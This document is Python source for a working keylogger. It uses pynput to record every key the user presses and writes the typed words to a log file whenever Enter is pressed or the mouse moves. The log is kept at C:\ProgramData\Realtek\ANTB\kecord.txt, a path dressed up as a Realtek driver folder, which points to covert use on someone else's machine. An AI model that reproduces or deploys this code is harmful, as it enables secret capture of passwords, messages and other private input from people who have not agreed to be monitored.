from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import logging

log_dir = "C:\\ProgramData\\Realtek\\ANTB"

logging.basicConfig(filename=(log_dir + "\\kecord.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

word = ""

def log_word():
    global word
    if word:
        logging.info(word)
        word = ''

def on_press(key):
    global word

    if key == Key.enter:
        logging.info(word)
        word = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.space:
         word += ' '
         return
    elif key == Key.backspace:
        word += '-1'
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False

def on_move(x, y):
    log_word()

with KeyboardListener(on_press=on_press) as k_listener, MouseListener(on_move=on_move) as m_listener:
    k_listener.join()
    m_listener.join()
